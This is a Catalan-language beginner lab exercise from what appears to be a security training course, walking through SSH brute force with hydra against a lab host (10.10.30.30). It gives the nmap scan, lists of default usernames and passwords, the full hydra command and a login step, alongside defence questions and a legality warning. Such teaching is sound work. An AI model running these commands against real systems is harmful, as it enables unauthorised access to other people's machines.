---
id: EX-08-09
title: "SSH brute force amb hydra - Explicat per a gent inexperta"
status: draft
version: 2.0
created: 2026-08-07
updated: 2026-08-07
authors:
  - Bernat Mora
  - Hermes Agent
tags:
  - per-a-principiants
  - explicacio-detallada
prerequisites:
  - LAB-15-10
  - ANN-09
related:
  - LAB-15-10
  - ANN-08
  - ANN-09
estimated_time: 30 min
difficulty: beginner
---

# EX-08-09 - SSH brute force amb hydra - Explicat per a gent inexperta

> Aprendre com funciona un atac de brute force contra SSH.

## Que necessites saber

### Que es SSH?

**SSH** (Secure Shell) es un protocol per **accedir remotament** a un altre ordinador de forma segura. Funciona pel **port 22**.

Si no saps que es SSH, llegeix primer [ANN-09](ann-09-comencar-de-zero.md).

### Que es un atac de brute force?

**Brute force** vol dir **provar totes les combinacions possibles** fins trobar la correcta.

Per exemple:
- Provar totes les contrasenyes de 4 digits: 0000, 0001, 0002... fins 9999
- Provar una llista de contrasenyes comunes: password, 123456, admin...

Es un atac lent pero efectiu si la contrasenya es feble.

### Que es hydra?

**hydra** es una **eina automatica** que fa brute force contra molts serveis: SSH, FTP, HTTP, MySQL, etc.

Es molt rapida perque prova moltes connexions a la vegada.

### Que es una wordlist?

Una **wordlist** es una **llista de paraules** que es fan servir per provar contrasenyes.

Algunes wordlists famoses:
- **rockyou.txt**: 14 milions de contrasenyes reals
- **common.txt**: les mes comunes

Al Kali ja en tens algunes a `/usr/share/wordlists/`.

### Que es fail2ban?

**fail2ban** es una eina que **bloqueja les IPs** que fan masses intents fallits. Es una proteccio contra brute force.

Si el servidor te fail2ban, els teus intents poden quedar bloquejats al cap de 5-10 intents.

### Glossari

- **SSH**: protocol d'acces remot segur (port 22)
- **brute force**: atac que prova moltes combinacions
- **hydra**: eina per fer brute force
- **wordlist**: llista de paraules per provar
- **fail2ban**: eina anti-brute force
- **contrasenya forta**: dificil d'endevinar

## Que has de fer

1. Des del Kali, obre una terminal
2. Comprova que el servei esta actiu: `nmap -sV -p 22 10.10.30.30`
3. Crea una llista d'usuaris: `nano users.txt`
4. Escriu aquesta llista (un per linia): root, admin, user, msfadmin, postgres, service
5. Guarda amb Ctrl+O, Enter, Ctrl+X
6. Crea una llista de contrasenyes: `nano passwords.txt`
7. Escriu: admin, password, 123456, msfadmin, root, pass, postgres
8. Guarda amb Ctrl+O, Enter, Ctrl+X
9. Executa: `hydra -L users.txt -P passwords.txt ssh://10.10.30.30 -t 4 -f`
10. Espera els resultats
11. Quan trobis credencials, entra: `ssh usuari@10.10.30.30`
12. Dins, escriu `whoami` per veure qui ets
13. Surt amb `exit`

## Que has de buscar

- Quantes combinacions ha provat hydra?
- Quines credencials has trobat?
- Quin usuari te mes riscos?
- Quant ha trigat?
- Com podem protegir-nos?

## Preguntes que has de respondre

1. Que es un atac de brute force?
2. Quines credencials has trobat?
3. Per que -t 4 es important?
4. Com podem protegir contra brute force?
5. Quines son les bones practiques per a contrasenyes SSH?

## Si no entens alguna cosa

1. **Torna a llegir** la seccio "Que necessites saber"
2. **Mira** [ANN-09](ann-09-comencar-de-zero.md) - Guia per a gent inexperta
3. **Mira** [ANN-08](ann-08-glossari-ports.md) - Glossari de ports
4. **Pregunta** si segueixes sense entendre

## Solucio de problemes

Si alguna cosa no funciona:

1. **Comprova** que el lab esta actiu (`docker ps` al Kali)
2. **Comprova** que tens acces a Internet des del Kali
3. **Comprova** que la IP que estas fent servir es correcta
4. **Llegeix** l'error amb atencio - sovint diu que passa

## Validacio

Quan acabis, compara els teus resultats amb els del document [LAB-15-11](../labs/lab-15-11-nmap-complet-metaploitable2.md).

## Seguretat

**Recorda**:
- Aixo es **nomes per practicar** al lab
- Mai en sistemes **reals** sense permis
- Practicar sense permis es **IL·LEGAL**
- Si tens dubtes, pregunta

## Referencies

- [ANN-09](ann-09-comencar-de-zero.md) - Començar de zero
- [ANN-08](ann-08-glossari-ports.md) - Glossari de ports
- [LAB-15-10](../labs/lab-15-10-lab-real-muntat.md) - Lab real muntat al Kali
- [LAB-15-11](../labs/lab-15-11-nmap-complet-metaploitable2.md) - Nmap complet
